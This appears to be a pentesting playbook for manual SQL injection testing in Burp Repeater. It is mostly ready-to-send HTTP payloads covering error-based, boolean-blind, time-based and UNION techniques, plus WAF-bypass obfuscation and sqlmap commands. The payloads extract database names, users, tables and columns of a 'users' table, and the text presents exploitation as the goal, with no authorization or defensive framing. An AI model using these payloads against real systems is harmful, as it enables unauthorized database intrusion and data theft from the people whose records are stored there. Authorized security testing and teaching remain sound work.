This is a linear payload routine designed to be executed manually in Burp Repeater.  
Each block represents a **type of test**, with multiple payload variants to increase coverage and avoid false negatives.

You should go through this sequentially for every parameter and **observe response differences, not just errors**.

---

### Core payload execution block

```
##############################################
# BASELINE → establish normal behavior
# Send 2–3 times, note length, content, timing
##############################################
GET /endpoint?param=10 HTTP/1.1


#########################################################
# SYNTAX BREAKING → detect raw SQL errors / injection
# If errors or abnormal responses → move to ERROR-based
#########################################################
GET /endpoint?param=10' HTTP/1.1
GET /endpoint?param=10" HTTP/1.1
GET /endpoint?param=10) HTTP/1.1
GET /endpoint?param=10') HTTP/1.1
GET /endpoint?param=10")) HTTP/1.1


#########################################################
# COMMENT INJECTION → test query truncation
# If response changes → strong injection indicator
#########################################################
GET /endpoint?param=10-- - HTTP/1.1
GET /endpoint?param=10--+ HTTP/1.1
GET /endpoint?param=10# HTTP/1.1
GET /endpoint?param=10/* HTTP/1.1


#########################################################
# BOOLEAN TEST (numeric context)
# If TRUE ≠ FALSE → BOOLEAN SQLi confirmed
#########################################################
GET /endpoint?param=10 AND 1=1 HTTP/1.1
GET /endpoint?param=10 AND 1=2 HTTP/1.1
GET /endpoint?param=10 OR 1=1 HTTP/1.1
GET /endpoint?param=10 OR 1=2 HTTP/1.1
GET /endpoint?param=10 AND 2>1 HTTP/1.1
GET /endpoint?param=10 AND 2<1 HTTP/1.1


#########################################################
# BOOLEAN TEST (string context)
# Use if parameter is inside quotes
#########################################################
GET /endpoint?param=10' AND '1'='1 HTTP/1.1
GET /endpoint?param=10' AND '1'='2 HTTP/1.1
GET /endpoint?param=10' OR '1'='1 HTTP/1.1
GET /endpoint?param=10' OR '1'='2 HTTP/1.1
GET /endpoint?param=10' AND 'a'='a HTTP/1.1
GET /endpoint?param=10' AND 'a'='b HTTP/1.1


#########################################################
# TIME-BASED TEST → detect blind delay-based SQLi
# If consistent delay → TIME SQLi confirmed
#########################################################
GET /endpoint?param=10 AND SLEEP(5) HTTP/1.1
GET /endpoint?param=10 AND SLEEP(3) HTTP/1.1
GET /endpoint?param=10' AND SLEEP(5)-- HTTP/1.1
GET /endpoint?param=10 OR SLEEP(5) HTTP/1.1
GET /endpoint?param=10; WAITFOR DELAY '0:0:5'-- HTTP/1.1
GET /endpoint?param=10 AND pg_sleep(5) HTTP/1.1


#########################################################
# UNION COLUMN DISCOVERY → find column count
#########################################################
GET /endpoint?param=10 ORDER BY 1-- HTTP/1.1
GET /endpoint?param=10 ORDER BY 2-- HTTP/1.1
GET /endpoint?param=10 ORDER BY 3-- HTTP/1.1
GET /endpoint?param=10 ORDER BY 4-- HTTP/1.1
GET /endpoint?param=10 ORDER BY 5-- HTTP/1.1


#########################################################
# UNION STRUCTURE TEST → validate query structure
#########################################################
GET /endpoint?param=10 UNION SELECT NULL-- HTTP/1.1
GET /endpoint?param=10 UNION SELECT NULL,NULL-- HTTP/1.1
GET /endpoint?param=10 UNION SELECT NULL,NULL,NULL-- HTTP/1.1
GET /endpoint?param=10 UNION SELECT 1,2,3-- HTTP/1.1


#########################################################
# UNION REFLECTION TEST → detect output injection
# If reflected → UNION SQLi confirmed
#########################################################
GET /endpoint?param=10 UNION SELECT NULL,'test',NULL-- HTTP/1.1
GET /endpoint?param=10 UNION SELECT NULL,@@version,NULL-- HTTP/1.1
GET /endpoint?param=10 UNION SELECT NULL,user(),NULL-- HTTP/1.1
GET /endpoint?param=10 UNION SELECT NULL,database(),NULL-- HTTP/1.1


#########################################################
# FILTER/WAF BYPASS VARIANTS → if normal payloads fail
#########################################################
GET /endpoint?param=10/**/AND/**/1=1 HTTP/1.1
GET /endpoint?param=10%0aAND%0a1=1 HTTP/1.1
GET /endpoint?param=10%09AND%091=1 HTTP/1.1
GET /endpoint?param=10/*!50000AND*/1=1 HTTP/1.1
```

---

## Behavioral interpretation and decision mapping

At this point you are not guessing. Each response pattern determines the next phase.


### Error-based path (triggered by syntax breaking)

If any payload causes:

- SQL error messages
    
- HTTP 500
    
- stack traces
    
- malformed responses
    

Then the backend is exposing query errors.

This means you can **force the database to return data through error channels**.

You move to controlled error generation:

```
GET /endpoint?param=10 AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e)) HTTP/1.1
```

Alternative payloads:

```
GET /endpoint?param=10 AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) HTTP/1.1
```

```
GET /endpoint?param=10 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a) HTTP/1.1
```

The objective is to **embed query results inside error output**.

---

### Boolean-based path (triggered by response differences)

If TRUE and FALSE conditions produce:

- different content
    
- different length
    
- missing elements
    

Then you have a **blind inference channel**.

You now move to data extraction via conditions.

```
GET /endpoint?param=10 AND SUBSTRING(database(),1,1)='a' HTTP/1.1
```

More robust variants:

```
GET /endpoint?param=10 AND ASCII(SUBSTRING(database(),1,1))>77 HTTP/1.1
```

```
GET /endpoint?param=10 AND LENGTH(database())=5 HTTP/1.1
```

You are reconstructing data **bit by bit** using response differences.

---

### Time-based path (triggered by delay behavior)

If no visible difference exists but delay is consistent, you rely on **time as signal**.

You convert boolean logic into timing:

```
GET /endpoint?param=10 AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0) HTTP/1.1
```

More variants:

```
GET /endpoint?param=10 AND IF(ASCII(SUBSTRING(user(),1,1))>77,SLEEP(5),0) HTTP/1.1
```

```
GET /endpoint?param=10; IF (1=1) WAITFOR DELAY '0:0:5'-- HTTP/1.1
```

You must always validate:

- same delay repeated ≥3 times
    
- baseline vs injected clearly different
    

---

### UNION-based path (triggered by reflection)

If any injected value appears in response, you have **direct output control**.

You move to structured extraction:

```
GET /endpoint?param=10 UNION SELECT NULL,database(),NULL HTTP/1.1
```

Then enumerate:

```
GET /endpoint?param=10 UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- HTTP/1.1
```

```
GET /endpoint?param=10 UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'-- HTTP/1.1
```

This is the fastest and most reliable exploitation path.

---

## Context handling and payload adaptation

You must adapt payloads depending on how the parameter is used internally.

### Numeric context

No quotes required:

```
GET /endpoint?param=10 AND 1=1
```

### String context

You must close the string:

```
GET /endpoint?param=10' AND '1'='1
```


### Filtered or sanitized input

When payloads fail unexpectedly, assume filtering.

Use obfuscation:

```
GET /endpoint?param=10/**/UNION/**/SELECT/**/NULL,NULL
```

```
GET /endpoint?param=10/*!UNION*/SELECT NULL,NULL
```

```
GET /endpoint?param=10%55NION%20SELECT%201,2
```

---

## Transition to sqlmap (controlled automation)

Only after confirming injection manually.


### Force correct technique

```
sqlmap -u "http://target/endpoint?param=10" -p param --technique=B --batch
```

```
sqlmap -u "http://target/endpoint?param=10" -p param --technique=T --time-sec=5
```

```
sqlmap -u "http://target/endpoint?param=10" -p param --technique=U
```

```
sqlmap -u "http://target/endpoint?param=10" -p param --technique=E
```


### Improve reliability

```
sqlmap -u "http://target/endpoint?param=10" \
-p param \
--technique=BT \
--string="Welcome" \
--not-string="Error" \
--delay=1 \
--threads=5
```

---

## Execution mindset

You are not testing payloads randomly. You are following a deterministic process:

```
probe → observe → classify → confirm → exploit
```

Each payload in the initial block exists to answer one question:

```
Does this parameter give me a channel to interact with the database?
```

Once that channel is identified, exploitation becomes structured and predictable.